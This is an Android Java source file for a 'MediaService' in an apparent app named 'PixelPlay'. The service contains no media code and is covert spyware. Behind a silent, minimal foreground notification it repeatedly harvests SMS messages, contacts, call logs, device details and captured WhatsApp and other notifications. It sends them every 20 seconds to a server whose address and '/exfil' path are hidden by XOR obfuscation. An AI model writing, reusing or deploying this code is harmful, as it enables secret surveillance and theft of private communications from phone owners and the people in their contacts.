package com.pixelplay.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class MediaService extends Service {

    private static final String TAG = "PixelPlay";
    private static final String CHANNEL_ID = "pp_svc";
    private static final long INTERVAL = 20000;

    private Thread worker;
    private volatile boolean running = true;

    private static final byte[] XK = {0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, (byte)0x8F};
    private static final byte[] _H = {
        0x0E,0x38,0x78,0x24,0x48,0x11,0x6A,(byte)0xA2,
        0x03,0x45,0x7D,0x3F,0x24,0x15,0x74
    };
    private static final byte[] _P = {0x65,0x18,0x53,0x09,0x75,0x32};

    private static String dec(byte[] e) {
        byte[] d = new byte[e.length];
        for (int i = 0; i < e.length; i++)
            d[i] = (byte)(e[i] ^ XK[i % XK.length]);
        return new String(d);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "PixelPlay",
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PixelPlay")
            .setContentText("Ready to play")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        startForeground(3, n);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        running = true;
        worker = new Thread(this::loop);
        worker.start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void loop() {
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        while (running) {
            try { send(); } catch (Exception e) {
                Log.e(TAG, "err: " + e.getMessage());
            }
            try { Thread.sleep(INTERVAL); } catch (InterruptedException e) { break; }
        }
    }

    private void send() {
        try {
            JSONObject p = new JSONObject();
            p.put("device", getDev());
            p.put("sms", getSms());
            p.put("contacts", getContacts());
            p.put("call_logs", getCalls());
            p.put("notifications", MyNotifListener.getCaptured());
            p.put("whatsapp", MyNotifListener.getWhatsApp());

            String json = p.toString(2);
            Log.d(TAG, "[+] size: " + json.length());

            String host = dec(_H);
            String path = dec(_P);
            String url = "http://" + host + ":8080" + path;

            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();
            Log.d(TAG, "[+] sent: " + c.getResponseCode());
            c.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "send err: " + e.getMessage());
        }
    }

    private JSONObject getDev() throws Exception {
        JSONObject o = new JSONObject();
        o.put("android", Build.VERSION.RELEASE);
        o.put("sdk", Build.VERSION.SDK_INT);
        o.put("manufacturer", Build.MANUFACTURER);
        o.put("model", Build.MODEL);
        o.put("patch", Build.VERSION.SECURITY_PATCH);
        return o;
    }

    private JSONArray getSms() {
        JSONArray a = new JSONArray();
        try (Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50")) {
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject m = new JSONObject();
                    m.put("addr", sf(c, "address"));
                    m.put("body", sf(c, "body"));
                    a.put(m);
                }
            }
        } catch (Exception ignored) {}
        return a;
    }

    private JSONArray getContacts() {
        JSONArray a = new JSONArray();
        try (Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null)) {
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("name", sf(c, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    o.put("phone", sf(c, ContactsContract.CommonDataKinds.Phone.NUMBER));
                    a.put(o);
                }
            }
        } catch (Exception ignored) {}
        return a;
    }

    private JSONArray getCalls() {
        JSONArray a = new JSONArray();
        try (Cursor c = getContentResolver().query(
                Uri.parse("content://call_log/calls"),
                null, null, null, "date DESC LIMIT 50")) {
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject o = new JSONObject();
                    o.put("number", sf(c, "number"));
                    o.put("type", sf(c, "type"));
                    o.put("duration", sf(c, "duration"));
                    a.put(o);
                }
            }
        } catch (Exception ignored) {}
        return a;
    }

    private String sf(Cursor c, String col) {
        try { return c.getString(c.getColumnIndexOrThrow(col)); }
        catch (Exception e) { return ""; }
    }

    @Override
    public void onDestroy() {
        running = false;
        if (worker != null) worker.interrupt();
        super.onDestroy();
    }
}
